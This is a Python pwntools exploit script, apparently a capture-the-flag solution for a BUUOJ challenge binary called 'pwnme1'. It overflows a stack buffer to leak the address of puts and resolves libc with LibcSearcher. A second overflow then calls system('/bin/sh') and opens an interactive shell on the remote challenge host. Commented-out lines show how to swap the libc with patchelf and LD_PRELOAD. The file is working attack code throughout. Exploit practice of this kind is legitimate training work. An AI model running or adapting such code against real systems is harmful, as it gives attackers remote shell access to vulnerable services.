from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + next(libc.search(b'/bin/sh'))

	return (system, binsh)


s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context(os='linux', arch='i386', log_level='debug')
# context(os='linux', arch='i386', log_level='debug')
binary = './pwnme1'

context.binary = binary
elf = ELF(binary)
p = remote('node4.buuoj.cn',28154) if argv[1]=='r' else process(binary)
# p = remote('node4.buuoj.cn',29924) if argv[1]=='r' else process(binary,
#             env={"LD_PRELOAD":"/home/javayuan/pwn_libc合集/Ubuntu16_32/libc-2.23_32.so"})
#替换libc和ld
# p = process(["/path/to/ld.so", binary],
#             env={"LD_PRELOAD":"/path/to/libc.so.6"})
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# patchelf --set-interpreter /lib64/32_3-linux.so.2 ./pwn
# patchelf --replace-needed libc.so.6 /home/javayuan/pwn_libc合集/Ubuntu16_64/libc-2.23.so ./pwn  #libc.so.6为需要替换的libc路径 第二个参数是需要加载的glibc的目录    pwn 是二进制文件

def bytes2int(content):
	return str(content,encoding='utf-8')

def int2bytes(content):
	return bytes(str(content),encoding='utf-8')
def dbg():
	gdb.attach(p)
	pause()
# start
# flag_addr = 0x08048677
# vul_addr = 0x08048624
# sla(b'6. Exit    ',b'5')
# payload = b'a'*(0xa4+4) + p32(flag_addr)
# sla(b'Please input the name of fruit:',payload)
# end
vul_addr = 0x08048624
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
sla(b'6. Exit    ',b'5')
payload = b'a'*(0xa4+4) + p32(puts_plt) + p32(vul_addr) + p32(puts_got)
sla(b'Please input the name of fruit:',payload)
ru(b'\n')
puts_addr = uu32(r(4))
system_addr,bin_sh_addr = ret2libc(puts_addr,'puts')

payload = b'a'*(0xa4+4) + p32(system_addr) + p32(vul_addr) + p32(bin_sh_addr)
sla(b'Please input the name of fruit:',payload)

itr()